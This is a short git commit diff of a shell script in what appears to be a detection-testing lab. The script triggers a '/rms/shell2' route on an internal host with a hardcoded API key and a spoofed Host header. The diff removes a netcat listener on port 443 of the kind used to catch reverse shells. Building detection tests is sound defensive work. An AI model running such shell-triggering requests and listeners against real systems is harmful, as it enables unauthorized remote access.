5b75e4cd563c01bbdf700a523c70406bb6159eb5
West Shepherd <wshepherd0010@gmail.com>
2023-04-16 10:16:42 -0400

    fixed detection job bug

--- client-commands/2_detection/5_execute-shell2-route.sh
+++ client-commands/2_detection/5_execute-shell2-route.sh
@@ -1,7 +1,6 @@
-nc -lp 443 &
 curl -s -X 'GET' "http://172.31.24.111/rms/shell2" \
  -H 'Host: 127.0.0.1:9080' \
  -H 'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1' \
  -H 'Accept: */*' \
  -H 'Accept-Encoding: utf8' \
- -H 'Connection: close' -o /dev/null & fg
+ -H 'Connection: close' -o /dev/null &
